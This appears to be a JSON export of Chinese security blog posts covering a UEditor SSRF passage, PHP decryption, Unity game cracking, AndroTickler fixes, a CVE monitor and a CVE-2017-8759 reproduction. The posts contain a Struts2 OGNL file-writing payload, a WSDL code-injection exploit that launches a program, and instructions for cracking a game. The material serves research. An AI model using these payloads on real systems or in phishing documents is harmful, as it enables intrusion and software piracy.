这里之所以写入内容为Struts2_Test.png，是由于在抓取图片时会判断图片链接的后缀是否为图片格式。当然还有其他的写法，例如 http://192.168.135.135:8080/Struts2_bugs-0.0.1-SNAPSHOT/test.action%3Fredirect%253A%24%257B%2523req%253d%2523context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#39;),%2523b%253D%2523req.getRealPath(%2522/%2522)%252B&#39;b5e592d2-ab5b-476d-865a-8299a0625490.png&#39;,%2523res%253d%2523context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),%2523res.getWriter().print(%2522oko%2522),%2523res.getWriter().print(%2522kok%2522),%2523res.getWriter().flush(),%2523res.getWriter().close(),new%2520java.io.BufferedWriter(new%2520java.io.FileWriter(%2523b)).append(%2523req.getParameter(%2522shell%2522)).close()%257D%26shell%3DStruts2_Test&amp;aaa.png也可以写入。 然后再次利用Ueditor抓取远程图片的功能将写入内网服务器的“图片文件”抓取下来，查看其内容。 这里需要抓取的图片地址为：http://192.168.135.155:8080/Struts2_bugs-0.0.1-SNAPSHOT/b5e592d2-ab5b-476d-865a-8299a0625490.png 由上图可以看出，最后抓取的文件保存地址为：/ueditor/jsp/upload/image/20180525/1527181480175039672.png 查看结果然后访问http://localhost:8088/ueditor/jsp/upload/image/20180525/1527181480175039672.png 查看是否攻击成功。 表明攻击成功。 0x06 总结由于UEditor在v1.4.3之前没有加入对内部IP的限制，所以在使用抓取图片的功能时，造成SSRF漏洞。可以进行内网服务器的探测。然后根据内网服务器的特征（如/jmx-console/images/logo.gif, /tomcat.png），判断其使用的组件，并猜测可能存在的漏洞，然后进行进一步的渗透。","tags":"ueditor ssrf"},{"title":"某PHP加密文件解密过程初探","url":"/2018/02/08/Free-PhpJiaMi-Decrypt/","text":"最近在52PJ上看到一篇关于PHP加密解密的帖子，过程非常详细，而且作者很负责，对于别人的回答也很热心。跟着动手做了一下，记录一下遇到的问题。这里针对的是PHP加密网站的免费加密进行的调试。 0x01 环境准备采用的IDE为VSCode，需要安装PHP DEBUG插件和XDebug 插件。安装php debug插件比较简单，直接快捷键ctrl + shift + x 或者 “查看-扩展” 打开扩展面板。输入”php debug”搜索。然后安装即可。其次是安装XDebug。安装可以参考:https://xdebug.org/docs/install 。首先查看一下PHP版本。我这里用的是5.5.30。打开php.ini，找到XDebug标签（我这里ext目录已经有xdebug.dll了，直接启用扩展即可）。如果没有XDebug标签，自己添加即可。打开扩展。注意设置xdebug.remote_autostart = 1。这样设置好debug和断点后，浏览器运行即可自动命中断点。打开VSCode，设置编辑php的可执行文件路径。这样调试所需的环境就配置好了。使用时打开左侧的调试按钮，然后添加配置语言选择PHP。给代码添加断点后，点击开始调试按钮。浏览器访问时会在断点处停下，就可以进行调试了。乱码的话可以通过更改文件编码来设置。快捷键Ctrl + Shift + P，选择更改文件编码，找到合适的编码。php最大执行时间是30秒，超过30秒会自动终止，因此调试的时候要修改一下时间，在php.ini 文件中修改最大运行时间为5分钟。 1max_execution_time = 300 0x02 解密1.独立加密上面环境已经准备好了，下面就开始正式工作了。首先需要获得一个加密的文件。我直接利用上面的文件去某加密网站进行加密。加密后大概是这样的 1&lt;?php /* PHP Encode by http://Www.PHPJiaMi.Com/ */error_reporting(0);ini_set(\"display_errors\", 0);if(!defined('kcapwkef'))&#123;define('kcapwkef',__FILE__);if(!function_exists(\"�㒁�؁��\"))&#123;function �����ٹ�($������)&#123;global$Đ���Л�,$�…… 使用PHP-Parser对代码进行格式化，便于调试。执行命令composer require nikic/php-parser利用作者的format.php将代码格式化。代码如下： 12345678910111213141516&lt;?phpuse PhpParser\\Error;use PhpParser\\ParserFactory;use PhpParser\\PrettyPrinter;require 'vendor/autoload.php';$code = file_get_contents('9014/t.php');$parser = (new ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);try &#123; $ast = $parser-&gt;parse($code);&#125; catch (Error $error) &#123; echo \"Parse error: &#123;$error-&gt;getMessage()&#125;\\n\"; return;&#125;$prettyPrinter = new PrettyPrinter\\Standard;$prettyCode = $prettyPrinter-&gt;prettyPrintFile($ast);file_put_contents('9014/t2.php', $prettyCode); 然后执行命令php format.php，会生成格式化的t2.php。选择一个不是多字节的字符集，这样在调试的时候可以显示出变量代表的内容。这里用的是Western (ISO 8859-1)。我的思路是在程序开始下断点，然后一直F10（单步跳过），当程序中断时，在此处下断点，F11进入（单步调试）。找到中断的原因，解决后再重复上述操作。F10运行时发现在102行退出了程序。然后在第102行下断点，F11单步运行。进入后继续F10运行。当运行到第23行时，程序退出。前面两个变量是多字节字符，所以看不到内容，后面的是die。看代码可以看到前两个分别在第13行和第15行出现。再次运行，当运行到第13行时F11进入。调用了第52行的函数（由于函数名是乱码，我们给起个名字decode_func）。直接在73行返回值处下断点，然后F5运行，看返回的结果。同理，查看第15行返回的结果。那么第23行处的代码为：php_sapi_name() == &#39;cli&#39; ? die() : &#39;&#39;;由于这里是在命令行下执行的，所以会退出。找到了问题所在，直接注释掉此处即可。然后重新执行。运行至第26行时再次退出。此处代码： 123if (!isset($_SERVER['HTTP_HOST']) &amp;&amp; !isset($_SERVER['SERVER_ADDR']) &amp;&amp; !isset($_SERVER['REMOTE_ADDR'])) &#123; die();&#125; 由控制台发现!isset($_SERVER[&#39;HTTP_HOST&#39;]) &amp;&amp; !isset($_SERVER[&#39;SERVER_ADDR&#39;]) &amp;&amp; !isset($_SERVER[&#39;REMOTE_ADDR&#39;])执行结果为true，所以会退出。还是屏蔽该if判断即可。重新执行。第28-32行对应代码。 12345$t = microtime(true) * 1000;eval(\"\");if (microtime(true) * 1000 - $t &gt; 100) &#123; die();&#125; 此处判断执行时间大于100毫秒就退出，当然还是注释即可。运行至第34行，程序退出。F11进入。调用了第52行的decode_func函数。直接查看返回值。第34行对应的代码为： 1!strpos(decode_func(substr($f, -45, -1)), md5(substr($f, 0, -46))) ? $undefined1() : $undefined2; decode_func是第52行的函数，$f是当前的文件，$undefined1和 $undefined2都不存在。查看strpos中两个参数。那么 ! strops(string,find) 的结果为true。则执行$undefined1()，这个方法不存在，就会Error并退出程序。如下图所示。解决方法是注释第34行或者将”!”去掉。去掉”!”会执行 $undefined2，只会警告而不会退出。这里采用”暴力”的手段，直接注释掉了。然后重新执行程序，F5运行到断点后，F11进入，然后F10运行。运行到38行时，查看返回的内容，是源文件的内容。这个内容就是我们需要的。可以通过file_put_contents将文件保存即可。查看输出的结果。也可以在第102行用file_put_contents将文件保存。使用原作者的decrypt.php也可解密。执行命令：php decrypt.php 9014\\t.php，会生成解密后的文件”t.php.decrypted.php”。 2._LIB库加密调试过程和独立加密类似。还用之前的t.php作为源文件，加密后生成两个文件，一个是t.php，一个是_lib.php。这里的t.php就比较简单了，直接调用了_lib.php文件。主要研究的还是_lib.php文件。老规矩，还是先格式化。新建文件夹viptest，将t.php和格式化后的_lib.php复制进去。然后对格式化后的_lib.php进行编码转换。下断点开始进行调试。这里断点为106行。然后浏览器访问，就会在断点处停止。F11进入后F10单步跳过。运行至第43行时退出，直接屏蔽这几行即可。然后重新访问。运行至第46行，校验数据完整性，由于_lib.php是格式化而来的代码，所以此处校验不通过，就会调用不存在的方法，然后产生错误而退出。执行的代码为 12$f = file_get_contents('_lib.php');!strpos(decode_func(substr($f, -45, -1)), md5(substr($f, 0, -46))) ? $undefined1() : $undefined2; 注释该校验即可。继续执行，查看返回即可看到加密前的代码了。 0x03 总结类似此类的加密文件在进行调试时需要先将代码格式化，选择不是多字节的字符集，然后进行调试。我的测试流程是首先在开始下断点，然后F10执行，当遇到程序退出时，在此处下断点，再次运行，运行到此处F11进入。进入后F10执行，找到问题所在解决后重复上述流程。 这里都是以免费加密为例，关于VIP加密的可以参考作者的文章【原创】某PHP加密文件调试解密过程 ，还有他的虚拟机加密解密的文章也值得学习。 所用的代码 0x04 参考https://www.52pojie.cn/thread-693641-1-1.html","tags":"php解密 php调试"},{"title":"Unity3d类安卓游戏逆向分析初探","url":"/2018/01/31/Unity3d-Android-Game-Reverse-Analysis-Of-The-Tabikaeru/","text":"0x01 前言最近一款养蛙的游戏非常火，但是语言是日文的。下载了一个汉化的，结果广告一大堆。反编译之后查看是Unity游戏，之前没接触过，就想着跟着看一下。关于这类的破解，可以在52pojie上进行搜索。有很多类似的案例。这里主要采用的工具为dnSpy，dnSpy 是一款针对 .NET 程序的逆向工程工具。反编译和打包采用的是apktool，当然也可以直接用改之理等工具。 0x02 修改数据下载app后重命名为zip文件，发现存在assets\\bin\\Data\\Managed目录，那么该游戏应该为Unity游戏。那么需要分析的文件就是就是Assembly-CSharp.dll。 首先修改一下抽奖券的数量。安装游戏后，找到抽奖的地方。抽奖的时候提示券不足。 使用dnSpy打开Assembly-CSharp.dll文件，然后搜索字符串”足”，可以发现有两个，打开后发现是第一个。由此可以猜测TicketStock代表抽奖券库存。ticket表示抽奖券数量。当页查找ticket，发现有一个initialize方法进行初始化。我们将此处的数量改为1000.快捷键Ctrl+E编辑IL指令。找到ticket变量后，将ldc.i4.0改为ldc.i4，然后将数值改为1000.确定后，发现ticket数值已经改变。重新打包APP后，进行安装。打开抽奖界面发现数量已经改变为1000。这样虽然达到了修改抽奖券的效果，但数量再大，总会被抽完的。那就换种方法，比如说抽奖的时候增加奖券，或者奖券一直不变。这里采用奖券数量固定的方法，使其不会变动。 1234567891011if (SuperGameMaster.TicketStock() &lt; 5)&#123; ConfilmPanel confilm = this.ConfilmUI.GetComponent&lt;ConfilmPanel&gt;(); confilm.OpenPanel(\"ふくびき券が足りません\"); confilm.ResetOnClick_Screen(); confilm.SetOnClick_Screen(delegate &#123; confilm.ClosePanel(); &#125;); return;&#125; 已知抽奖的时候奖券是从SuperGameMaster.TicketStock()获取的，找到该方法。令其返回值为固定的数值。右键编辑IL指令。将其值修改为9000.然后保存后打包并重新安装。此时无论抽多少次，奖券都不再变化。另一个就是修改三叶草的数量了。三叶草是该游戏中流行的货币，买东西都是需要该物品。同理找到CloverPointStock()方法。将其返回值修改为8888。之后就可以随便买买买了，三叶草的数量也不会发生变化了。 0x03 汉化然后就是进行汉化了。汉化的方法和上面的类似。首先搜索需要修改的文字。例如给小青蛙起名字的时候。直接进行字符串搜索。然后修改为对应的中文就行了。进入游戏查看。修改其他处的文字也是这样操作即可。当然这种修改方法比较慢，还有另外一种，直接将他人汉化过的dll文件复制进来，可以快速达到汉化的目的，也没有广告的烦恼了。 0x04 其他修改按照以上方法修改的时候，每次都需要重新玩，还要经过”新手教学阶段”。我们可以使用安卓的备份功能，进行备份。然后重新安装app后直接恢复备份即可。首先需要在AndroidManifest.xml文件中增加android:allowBackup=&quot;true&quot;。这样就可以使用备份命令了。命令如下： 12adb backup -nosystem -noshared -noapk -f jp.co.hit_point.tabikaeru.ab jp.co.hit_point.tabikaeru//-nosystem表示不备份系统应用 -noshared表示不备份应用存储在SD中的数据 -noapk表示不备份应用APK安装包 -f 表示备份的.ab文件路径和文件名 最后是要备份应用的packageName 手机备份操作界面： 恢复命令比较简单 1adb restore jp.co.hit_point.tabikaeru.ab 手机备份还原界面 然后就可以进行进度的保存和恢复了。就省去了每次都要进行”新手教学”的烦恼。 0x05 总结这个游戏修改起来比较简单，首先判断为该游戏为Unity3d。然后使用dnSpy来对Assembly-CSharp.dll文件进行修改。根据特定的字符串找到需要修改的位置，修改后进行打包签名后即可。原版APK修改后的APK（修改了抽奖券、三叶草和部分汉化） 0x06 参考[1]https://www.52pojie.cn/search.php?mod=forum&amp;searchid=23262&amp;orderby=lastpost&amp;ascdesc=desc&amp;searchsubmit=yes&amp;kw=unity3d[2] https://www.52pojie.cn/thread-647612-1-1.html","tags":"unity3d 青蛙旅行 逆向分析"},{"title":"安卓渗透利器AndroTickler使用排雷指北","url":"/2018/01/03/How-To-Use-AndroTickler/","text":"0x01 前言AndroTickler是一款用于Android应用程序渗透测试和审计的工具包。更多介绍可以参考https://github.com/ernw/AndroTickler 。本文主要记录一下在使用过程中所遇到的问题和解决的方法。 本文的测试环境如下：系统为win10 x64，jdk版本为java8，gradle版本为4.1。采用了夜神模拟器。 主要包括以下几个方面。 编译环境的准备 使用过程中遇到的问题以及解决方法 0x02 编译环境的准备1. Gradle的安装首先需要安装Java，我采用的是Java8（安装工具说明，需要Java7以上）。下载地址：http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html 。（安装过程省略） 关于gradle的安装可以参考https://gradle.org/install/ ，我这里是直接下载安装包https://services.gradle.org/distributions/gradle-4.4.1-bin.zip， 解压之后添加环境变量。 2. cmder工具安装该步骤非必需，可以省略。下载地址：https://github.com/cmderdev/cmder/releases/解压添加环境变量即可使用。 使用该工具除了界面好看外，可以多个tab，也可以运行部分linux命令。当然也可以使用其他工具，如cygwin。如果没有使用这类工具的话，需要将代码中一些命令修改，如cp命令。 3. Git工具安装该步骤非必需，可以省略。下载地址：https://desktop.github.com/安装即可。然后下载 AndroTickler 4.其他工具安装还需要安装adb, sqlite3, strings等工具。adb的话安装夜神模拟器的时候自动，名字为nox_adb，功能一样。sqlite3可以用https://www.sqlite.org/ 下载。strings的官网，https://docs.microsoft.com/en-us/sysinternals/downloads/strings ，下载地址为：https://download.sysinternals.com/files/Strings.zip 。解压后加入环境变量即可。 然后就是开始编译和使（入）用（坑）了。 0x03 使用过程中遇到的问题以及解决方法上面环境已经搭建好了，代码也下载了，然后就开始入坑吧。编译的话很简单，使用命令gradle &amp;&amp; gradle build即可。然后会在build\\libs目录下生成AndroTickler.jar文件。 软件生成了，那么看看有什么功能吧，使用命令： 1java -jar AndroTickler.jar -h 貌似一切正常。下面开始查看安装的app。 使用命令 1java -jar AndroTickler.jar -pkgs 并没有返回安装的app已知列出已经安装的app命令是adb shell pm list package而我用的模拟器，所以应该使用命令是nox_adb shell pm list package所以这里要替换程序中的adb为nox_adb。这里我用idea来打开代码然后将命令中的adb替换为nox_adb即可替换后重新编译并查看已安装的app。 发现列出了安装过的app。虽然有警告，暂且不管。查找特定的app并查看信息 12java -jar AndroTickler.jar -findPkg com.example.simpleencryptionjava -jar AndroTickler.jar -pkg com.example.simpleencryption -info 发现报错，提示没有连接的设备。通过adb查看连接的设备。nox_adb devices -l发现有，但是使用工具未查看到。通过错误的信息，定位到initialization\\TicklerChecks.java的checkDevices方法。 123456789101112131415public void checkDevices() throws TNotFoundEx&#123; String command = \"nox_adb devices -l\"; Commando commando = new Commando(); String op = commando.executeCommand(command); OtherUtil oU = new OtherUtil(); ArrayList&lt;String&gt; devices = oU.getRegexFromString(op, \"(model:.*?device:.+$?)\"); int eligDevices = devices.size(); if (eligDevices&gt;1) throw new TNotFoundEx(\"ERROR: 2 or more Android devices are connected to the host, please connect only one Android device.\"); if (eligDevices == 0) throw new TNotFoundEx(\"ERROR: No Android devices detected by the host. Execute adb devices -l to check the connected devices\"); &#125; 发现通过命令查询的结果为： 12List of devices attached127.0.0.1:62025 device 明显通过正则不能匹配，那就改正则了。为了方便，直接改为ArrayList&lt;String&gt; devices = oU.getRegexFromString(op, &quot;(.*device\\\\n)&quot;); 然后编译运行。这个提示libs需要和jar文件在同一目录。将Tickler.conf和libs复制到与AndroTickler.jar同一目录。竟然报同样的错误，而且该目录下出现了一个H的文件夹。通过错误的信息，定位到initialization\\TicklerChecks.java的checkExternalLibDir方法。 123456789101112131415private void checkExternalLibDir() throws TNotFoundEx&#123; String jarLoc = this.getJarLocation(); String libDirLoc=jarLoc+TicklerConst.generalLibName; File tickLib = new File (libDirLoc); if (tickLib.exists())&#123; TicklerVars.isLib = true; TicklerVars.libDir = libDirLoc; &#125; //Lib directory not found else &#123; throw new TNotFoundEx(\"Lib directory not found. \\nMake sure that \"+TicklerConst.generalLibName+\" directory exists in the same directory as Tickler.jar\"); &#125; &#125; 查看代码，tickLib由jarLoc和TicklerConst.generalLibName拼接，而TicklerConst.generalLibName是常量，所以需要查看jarLoc是如何获取的。跟进getJarLocation方法 1234567891011121314public String getJarLocation()&#123; File myJar; try&#123; File myJar1 = new File(System.getProperty(\"java.class.path\"));//获取jar路径 myJar = myJar1.getAbsoluteFile().getParentFile();//获取jar上级目录 &#125; catch(Exception e)&#123; myJar = new File(\".\"); &#125; String jarLoc = this.correctJarLoc(myJar.getAbsolutePath()); return jarLoc;&#125; 首先获取了运行的jar的路径，然后获取其父路径并将其值赋值给myJar。然后调用了correctJarLoc方法。进行跟进correctJarLoc方法，进去查看 1234567891011121314151617181920public String correctJarLoc(String jarLoc)&#123; String finalLoc=jarLoc; if (jarLoc.contains(\":\"))//wtf? 造成问题的代码 finalLoc = jarLoc.substring(0, jarLoc.indexOf(\":\"));//wtf? 造成问题的代码 Matcher m = Pattern.compile(\"\\\\s+(.+)\").matcher(jarLoc); if (m.find()) finalLoc = m.group(1); if (finalLoc.matches(\".+\\\\n$\"))&#123; finalLoc = finalLoc.substring(0, jarLoc.length()-1); &#125; if (finalLoc.matches(\".+\\\\.$\"))&#123; finalLoc = finalLoc.substring(0, jarLoc.length()-1); &#125; if (!finalLoc.matches(\".+/$\"))&#123; finalLoc = finalLoc+\"/\"; &#125; return finalLoc;&#125; 然后立马发现问题的所在了。这里因为是windows系统，所以路径出现:是很正常的，而这里直接截取了盘符。这就是出现了一个名为H的文件夹的原因。解决方法：删除这两行代码即可。之后再编译运行。编译运行后发现警告没了，但新的错误出现了。通过错误信息定位到apk\\ApkToolClass.java的apkToolDecode方法。暂时先利用下面代码替换。 12//File file = new File(\"/dev/null\");File file = new File(\"H:\\\\tmp\\\\\"); 从之后文件的内容来看，该文件里面会记录一些操作记录。 再次编译运行，没有任何结果信息也没有报错。而在Tickler_workspace\\com.example.simpleencryption\\logs.pullLog.log发现了这样的日志。安装过的app保存位置为：/data/app修改Tickler.conf文件 123Tickler_local_directory &#x3D; H:&#x2F;workspace&#x2F;eclipse&#x2F;AndroTickler&#x2F;build&#x2F;libs&#x2F;Tickler_sdcard_directory &#x3D; &#x2F;data&#x2F;app&#x2F;Frida_server_path &#x3D; &#x2F;data&#x2F;local&#x2F;tmp&#x2F;frida-server-10.3.14-android-arm 编译运行，没有报错，查看Tickler_workspace\\com.example.simpleencryption\\logs.pullLog.log文件 1cannot create &#39;H:\\workspace\\eclipse\\AndroTickler\\build\\libs\\com.example.simpleencryption\\\\&#39;: Not a directory 然后通过调试，来寻找错误的地方（这里的图为之前调试的图( ╯□╰ )） 执行的命令为：nox_adb pull /data/app/com.jnu.ctf2017-1.apk H:/AndroTickler/com.jnu.ctf2017//测试后发现，使用adb pull导出文件时，pc的路径最后不能有\\或者/ 直接修改base\\FileUtil.java中copyDirToHost方法 12// this.pullFromSDcard(TicklerVars.sdCardPath+srcName, dest+\"/\"); by fuping this.pullFromSDcard(TicklerVars.sdCardPath+srcName, dest); 修改base\\FileUtil.java中pullFromSDcard方法 12345678910111213public void pullFromSDcard(String src, String dest) &#123; String fName = this.getFileNameFromPath(src); this.warnOverrideAndDelete(dest+fName); //by fuping File f = new File(dest); if(!f.exists())&#123; f.mkdirs(); &#125;// by fuping dest = f.getPath(); String command = \"nox_adb pull \"+src+\" \"+dest; int pullResult=this.commando.executeProcessForAdbPull(command); this.deleteDirFromDevice(src);&#125; 还有一些需要更改的地方，例如将代码中调用dex2jar-2.1的.sh脚本改为.bat 。之后在编译运行。 此时这个工具才能算可以使用，还有其他功能（例如Frida），我并未测试。当然还可能还会有其他问题，这里就不再深入了。 这里放上一个查看app详细信息的结果。 可以看到安装日期、使用权限、数据库存储等等信息。 0x04 总结虽然看起来在运行的时候有很多坑，但其原因也是环境的问题（我采用的是Windows）。而且我使用了模拟器而不是真机，所以也可能造成一些问题。但是这些都是无关紧要的，都是很小的错误，修改一下就可以用了。我这里仅仅使用了查看app信息的功能，并未测试其他功能。更多功能可以参考https://github.com/ernw/AndroTickler 。","tags":"安卓 androtickler"},{"title":"CVE监控之Python代码实现","url":"/2017/12/11/NEW-CVE-Monitor/","text":"0x01 前言前几天在先知上看到伪全栈式安全研发：CVE监控这篇文章，就想着也实现一下代码进行最新CVE的监控。语言采用了Python，数据库也为Mongodb数据库。代码和实现的什么不重要，重要的是过程。 主要包括以下几个方面。 获取最新的CVE列表和详情主要采用了python的requests模块和BeautifulSoup模块。 将最新的CVE信息存入数据库数据库使用了Mongodb，采用了pymongo模块。 通过邮件发送最新的CVE信息发送邮件采用了smtplib模块。 定时执行任务使用了linux的crontab来实现。 0x02 实现过程1. 获取最新的CVE列表和详情访问https://cassandra.cerias.purdue.edu/CVE_changes/today.html ，可以获取每天新增的CVE信息。 通过查看源代码，发现没html没什么规律可言，都是些超链接。要想获取最新的列表，可以通过取文本中间的方法来获取。这里需要获取New entries:和Graduations之间的内容。然后通过BeautifulSoup来解析其中的超链接。主要代码如下： 1234567891011def getCVES():# 获取最新到CVE列表 try: url = 'https://cassandra.cerias.purdue.edu/CVE_changes/today.html' res = requests.get(url, headers=headers, timeout=60) CVEList_html = getMiddleStr(res.text, 'New entries:', 'Graduations') soup = BeautifulSoup(CVEList_html, 'html.parser') for a in soup.find_all('a'): print(a['href']) print(a.string) except Exception as e: print(e) 获取文本中间内容的代码： 123456def getMiddleStr(content, startStr, endStr): # 获取文本中间内容 startIndex = content.index(startStr) if startIndex &gt;= 0: startIndex += len(startStr) endIndex = content.index(endStr) return content[startIndex:endIndex] 运行效果：超链接的地址是CVE的详情。随便进入一个查看效果。例如：http://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-0874这里需要记录的信息有：CVE-ID、Description、Assigning CNA和Date Entry Created。 通过查看网页源码发现，所有需要记录的信息在一个表格里面。但该页面有很多table，而且没有明显的标识来区分。而该table在div中，可以通过id来获取。CVE-ID可以直接通过soup.find(nowrap=&#39;nowrap&#39;).find(&#39;h2&#39;).string获取。其他的几个信息可以通过获取相应tr中的td中的内容获得。这样就可以获取最新的CVE列表和详情。 2. 将最新的CVE信息存入数据库数据库采用了Mongodb。安装方法apt-get install mongodb然后启动数据库 1234mkdir /var/data/ #创建数据存储位置mongod --port 65521 --dbpath /var/data/ --bind_ip 127.0.0.1 #启动mongodb，指定端口和路径，且仅本机可连mongo 127.0.0.1:65521/mydb db.createUser(&#123;user:'tass',pwd:'liehu',roles:[&#123;role:'dbOwner',db:'mydb'&#125;]&#125;) #添加认证 Mongodb数据库插入一条数据，一般使用的是insert。 1db.test.insert(&#123;\"title\":\"test1\", \"blog_cont\":\"test1\"&#125;) 如果我们想实现一个如果title存在，就对数据进行更新，不存在，就插入。可以这样来实现。 123db.test.update(&#123;\"title\":\"test2\"&#125;, &#123;$set:&#123;\"title\":\"test2\", \"blog_cont\":\"test2\"&#125;&#125;, &#123;upsert:true&#125;)db.test.update(&#123;\"title\":\"test1\"&#125;, &#123;$set:&#123;\"title\":\"test1\", \"blog_cont\":\"test3\"&#125;&#125;, &#123;upsert:true&#125;)db.test.find() 执行完成后最终有两条数据，title分别为test1和test2，对应的内容为test3和test2. 因此在插入数据的时候，我们可以直接使用db.test.update({&quot;title&quot;:&quot;test2&quot;}, {$set:{&quot;title&quot;:&quot;test2&quot;, &quot;blog_cont&quot;:&quot;test2&quot;}}, {upsert:true})这种方式来实现。 更新只需更改data内容即可。 为了数据库的安全性，使用--bind_ip 127.0.0.1来设置数据库仅本地可以连接。更多mongodb数据库的配置可以参考MongoDB Mongodb.conf 配置 Auth。 3. 通过邮件发送最新的CVE信息发送邮件这里用到了smtplib。发送邮件比较简单，就直接贴代码了。 123456789101112131415161718def sendEmail(mail_msg): # 发送邮件 sender = 'from@163.com' # 发件人 password = 'password' # 发件人密码 receiver = 'receiver@163.com' # 收件人 message = MIMEText(mail_msg, 'plain', 'utf-8') #以文本发送 message['From'] = sender message['To'] = receiver subject = '最新CVE列表' message['Subject'] = Header(subject, 'utf-8') try: smtpObj = smtplib.SMTP('smtp.163.com') smtpObj.login(sender, password) smtpObj.sendmail(sender, receiver, message.as_string()) print('邮件发送成功') except smtplib.SMTPException: print('Error: 无法发送邮件') 4. 定时执行任务直接使用linux下的crontab来完成。例如设置每天早上7点执行，可以这样设置： 10 7 * * * python /myJob/CVE-Monitor.py &gt;&gt; /log/CVE-Monitor.log 根据https://cassandra.cerias.purdue.edu/CVE_changes/ 看到today.html更新的时间是明天的06:53，对应北京时间是19:53。若想及时获取，可以更换时间为20:00. 5.完善和优化到这里监控脚本完成的差不多了，剩下就是如何来融合一起并改善了。为了方便发送邮件内容和插入数据库，我们新建类CVEInfo。主要代码如下： 123456789101112131415161718192021222324class CVEInfo: def __init__(self,url, cveid, description, company, createdate): self.url = url self.cveid = cveid self.description = description self.company = company self.createdate = createdate def show(self): return '&lt;p&gt;&lt;b&gt;漏洞编号：&lt;/b&gt;&lt;a href=\"'+self.url+'\"&gt;'+self.cveid+'&lt;/a&gt;&lt;/p&gt;&lt;b&gt;相关厂商：&lt;/b&gt;'\\ +self.company +'&lt;br&gt;&lt;b&gt;披露日期：&lt;/b&gt;'\\ +self.createdate+'&lt;br&gt;&lt;b&gt;漏洞描述：&lt;/b&gt;'\\ +self.description + '&lt;br&gt;&lt;br&gt;&lt;hr/&gt;' def add(self): data = &#123; 'cveid': self.cveid, 'description': self.description, 'company': self.company, 'createdate': datetime.strptime(self.createdate, \"%Y%m%d\"), 'addDate': time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time())), &#125; return data 为了美观，将邮件以html方式发送 1message = MIMEText(mail_msg, 'html', 'utf-8') 邮箱收到的效果：查看数据库数据： 从上面两张图片可以看到有三十多个，但我们有时候并不是都需要看。我们可以根据Description中关键信息来进行过滤，仅仅将我们需要关注的CVE信息发送到邮箱或进行入库操作。如下图为获取CVE-2017-8295的信息。然后修改main方法，根据是否有关注的CVE信息来决定邮件的内容。这里先用本地服务器为例，新建today.html文件，其中包含CVE-2017-9805和CVE-2017-16241。运行代码结果打印了一条包含了我们的关键字的数据。邮件中的内容如下所示：这样就能过滤其他CVE信息，仅仅记录我们关注的内容了。 0x03 总结本文主要用到了BeautifulSoup解析网页和mongodb数据库的使用，然后就可以将想要的内容保存到数据库中。脚本并不限于在此处使用，也可以修改一下抓取其他网站内容。代码地址：https://github.com/fupinglee/MyPython/blob/master/work/CVE-Monitor.py查询的功能就不做了，若想实现其他功能，可以自行增加和修改。 0x03 参考[1]https://xianzhi.aliyun.com/forum/topic/1694/[2]http://blog.csdn.net/guoxingege/article/details/47339885","tags":"cve-monitor mongodb数据库 python"},{"title":".NET框架0Day漏洞CVE-2017-8759复现过程","url":"/2017/09/14/CVE-2017-8759-Remote-Code-Execution-Vulnerability-Replication/","text":"漏洞概述FireEye最近检测到一个恶意的Microsoft Office RTF文档，利用CVE-2017-8759（一种SOAP WSDL解析器代码注入漏洞）。此漏洞允许在解析SOAP WSDL定义内容期间注入任意代码。 基本信息漏洞名称：.NET Framework远程代码执行漏洞漏洞编号：CVE-2017-8759漏洞影响：.NET系列产品的远程代码执行（RCE）并进一步控制系统利用场景：远程钓鱼、社会工程影响版本：以下.NET版本&emsp;&emsp;&emsp;&emsp;&emsp;&nbsp;&nbsp;Microsoft .NET Framework 4.6.2&emsp;&emsp;&emsp;&emsp;&emsp;&nbsp;&nbsp;Microsoft .NET Framework 4.6.1&emsp;&emsp;&emsp;&emsp;&emsp;&nbsp;&nbsp;Microsoft .NET Framework 3.5.1&emsp;&emsp;&emsp;&emsp;&emsp;&nbsp;&nbsp;Microsoft .NET Framework 4.7&emsp;&emsp;&emsp;&emsp;&emsp;&nbsp;&nbsp;Microsoft .NET Framework 4.6&emsp;&emsp;&emsp;&emsp;&emsp;&nbsp;&nbsp;Microsoft .NET Framework 4.5.2&emsp;&emsp;&emsp;&emsp;&emsp;&nbsp;&nbsp;Microsoft .NET Framework 3.5&emsp;&emsp;&emsp;&emsp;&emsp;&nbsp;&nbsp;Microsoft .NET Framework 2.0 SP2影响产品：Office(word excel)Edge IE WinOS Skype Lync Sharepoint 漏洞利用点PrintClientProxy方法中的WSDL解析器模块中存在代码注入漏洞。如果提供的包含CRLF序列的数据，则IsValidUrl不会执行正确的验证。这就造成了攻击者注入和执行任意代码。 这里不详细介绍了（因为我也不懂），可以参考火眼和360的分析。 利用过程方法一新建一个图片文件，名字为office.png（其他格式也行），内容为： 12345678910111213141516171819202122&lt;definitions xmlns=\"http://schemas.xmlsoap.org/wsdl/\" xmlns:soap=\"http://schemas.xmlsoap.org/wsdl/soap/\" xmlns:suds=\"http://www.w3.org/2000/wsdl/suds\" xmlns:tns=\"http://schemas.microsoft.com/clr/ns/System\" xmlns:ns0=\"http://schemas.microsoft.com/clr/nsassem/Logo/Logo\"&gt; &lt;portType name=\"PortType\"/&gt; &lt;binding name=\"Binding\" type=\"tns:PortType\"&gt; &lt;soap:binding style=\"rpc\" transport=\"http://schemas.xmlsoap.org/soap/http\"/&gt; &lt;suds:class type=\"ns0:Image\" rootType=\"MarshalByRefObject\"&gt;&lt;/suds:class&gt; &lt;/binding&gt; &lt;service name=\"Service\"&gt; &lt;port name=\"Port\" binding=\"tns:Binding\"&gt; &lt;soap:address location=\"http://localhost?C:\\Windows\\System32\\calc.exe?011\"/&gt; &lt;soap:address location=\"; if (System.AppDomain.CurrentDomain.GetData(_url.Split('?')[0]) == null) &#123; System.Diagnostics.Process.Start(_url.Split('?')[1], _url.Split('?')[2]); System.AppDomain.CurrentDomain.SetData(_url.Split('?')[0], true); &#125; //\"/&gt; &lt;/port&gt; &lt;/service&gt;&lt;/definitions&gt; 然后放在web目录。根据样本文件，发现是在word文档中添加一个SOAP标记。格式为soap:wsdl=http://192.168.135.135/office/office.png本次以样本为例，然后修改其中的地址。 分别用样本和自己的web地址生成特hex格式的地址，然后将样本中的地址更换为自己的地址即可。（注意替换的长度需保持一致） 样本文件最重要的是倒数第三行（看起来是空白），然后可以将上面无用的内容全部删除，只留下最后三行。 